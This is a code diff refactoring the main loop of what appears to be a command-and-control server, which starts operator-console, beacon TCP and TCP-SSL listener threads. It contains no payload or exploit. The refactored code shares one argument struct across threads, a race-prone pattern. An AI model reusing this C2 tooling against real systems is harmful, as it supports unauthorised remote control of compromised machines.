@@ -10,45 +10,11 @@
 //#include "./includes/register.h"
 
 // communication channels
-// tcp
-#include "./includes/tcp/beacon_tcp.h"
-#include "includes/tcp/tcp_listener.h"
-// tcp ssl
-#include "includes/tcp_ssl/tcp_ssl.h"
-#include "includes/tcp_ssl/beacon_tcp_ssl.h"
-// http
-
-// https
-
+#include "./includes/listener.h"
 // logs
-#include "includes/logs.h"
+#include "./includes/logs.h"
 
-struct database_configs_t {
-    char database_server[BUFFER_SIZE];
-    char username[BUFFER_SIZE];
-    char password[BUFFER_SIZE];
-    char database[BUFFER_SIZE];
-};
-
-
-struct operator_console_t {
-    int x;
-    int port;
-};
-
-struct communication_channels_t {
-    bool tcp;
-    bool https;
-    bool tcp_ssl;
-    // ports
-    int tcp_port;
-    int https_port;
-    int tcp_ssl_port;
-    // ssl certificates
-    char ssl_cert[0x100];
-    char ssl_key[0x100];
-};
-
+#include "common.h"
 
 
 char *server_config();
@@ -93,35 +59,46 @@ int main() {
     
     cJSON_Delete(config);
     // open logs
-    if (db_conn(database->database_server, database->username, database->password, database->database)) {
+    if (db_conn(database->database_server, database->username, database->password, database->database) == -1) {
         log_message(LOG_ERROR, "Failed to connect to database");
-        sleep(120);
+        exit(EXIT_FAILURE);
     }
+
+
+    //strncpy(g_dbconf->host, database->database_server, BUFFER_SIZE-1);
+    //g_dbconf->host[BUFFER_SIZE-1] = '\0'; // ensure null-termination
+//
+    //strncpy(g_dbconf->user, database->username, BUFFER_SIZE-1);
+    //g_dbconf->user[BUFFER_SIZE-1] = '\0';
+//
+    //strncpy(g_dbconf->pass, database->password, BUFFER_SIZE-1);
+    //g_dbconf->pass[BUFFER_SIZE-1] = '\0';
+//
+    //strncpy(g_dbconf->db, database->database, BUFFER_SIZE-1);
+    //g_dbconf->db[BUFFER_SIZE-1] = '\0';
+//
+    //g_dbconf->port = 3306;
+//
     log_message(LOG_INFO, "Database connect successfully");
 
-    struct Args_t {
-        char cert[BUFFER_SIZE];
-        char key[BUFFER_SIZE];
-        int port;
-    };
+    struct  main_threads_args_t *args = malloc(sizeof(*args));
+    strncpy(args->cert, channels->ssl_cert, BUFFER_SIZE -1 );
+    strncpy(args->key, channels->ssl_key, BUFFER_SIZE - 1);
 
     do {
         pthread_t operator_thread = 0, tcp_thread = 0, tcp_ssl_thread = 0; // Initialize to 0
         int operator_thread_created = 0, tcp_thread_created = 0, tcp_ssl_thread_created = 0;
     
         if (operator->port > 0) {
-            struct Args_t *args = malloc(sizeof(*args));
             if (!args) {
                 log_message(LOG_ERROR, "Failed to allocate args for operator thread");
                 sleep(30);
                 continue;
             }
     
-            strncpy(args->cert, channels->ssl_cert, BUFFER_SIZE);
-            strncpy(args->key, channels->ssl_key, BUFFER_SIZE);
             args->port = operator->port;
     
-            if (pthread_create(&operator_thread, NULL, Operator_conn, (void*)args) == 0) {
+            if (pthread_create(&operator_thread, NULL, operator_listener, (void*)args) == 0) {
                 operator_thread_created = 1; // Mark as created
                 log_message(LOG_INFO, "Operator Console listener started successfully");
             } else {
@@ -131,10 +108,10 @@ int main() {
                 sleep(30);
             }
         }
-    
         if (channels->tcp) {
+            args->port = channels->tcp_port;
             log_message(LOG_INFO, "TCP Listener Thread Starting : %d", channels->tcp_port);
-            if (pthread_create(&tcp_thread, NULL, tcp_agent_conn, (void*)&channels->tcp_port) == 0) {
+            if (pthread_create(&tcp_thread, NULL, tcp_listener, (void*)args) == 0) {
                 tcp_thread_created = 1;
             } else {
                 log_message(LOG_ERROR, "Failed to start TCP listener thread");
@@ -144,15 +121,11 @@ int main() {
     
         if (channels->tcp_ssl) {
             log_message(LOG_INFO, "TCP (SSL) Listener Thread Starting : %d", channels->tcp_ssl_port);
-            struct Args_t *args = malloc(sizeof(*args));
             if (!args) {
                 log_message(LOG_ERROR, "Failed to allocate args for SSL thread");
                 sleep(30);
                 continue;
             }
-    
-            strncpy(args->cert, channels->ssl_cert, BUFFER_SIZE);
-            strncpy(args->key, channels->ssl_key, BUFFER_SIZE);
             args->port = channels->tcp_ssl_port;
     
             if (pthread_create(&tcp_ssl_thread, NULL, tcp_ssl_listener, (void*)args) == 0) {
